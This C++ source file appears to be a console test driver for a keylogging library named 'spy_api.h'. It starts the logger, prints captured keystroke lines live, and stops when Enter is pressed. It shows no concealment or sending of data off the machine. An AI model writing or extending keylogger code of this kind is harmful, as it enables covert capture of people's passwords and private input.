#include "spy_api.h"
#include <iostream>
#include <windows.h>

int main()
{
    int result = spy_start(nullptr, 0, 1, 0, 0, 1);
    if (result != 0) {
        std::wcout << L"[ERROR] spy_start failed with code: " << result << std::endl;
        return 1;
    }

    std::wcout << L"Keylogger started. Live logs:\n\n";

    wchar_t buffer[8192];
    while (true)
    {
        size_t len = spy_read_line_w(buffer, _countof(buffer));
        if (len > 0) {
            std::wcout << buffer << L'\n';
        }

        if (GetAsyncKeyState(VK_RETURN) & 0x8000) {
            break;
        }

        Sleep(50);
    }

    spy_stop();
    std::wcout << L"\nKeylogger stopped.\n";
    return 0;
}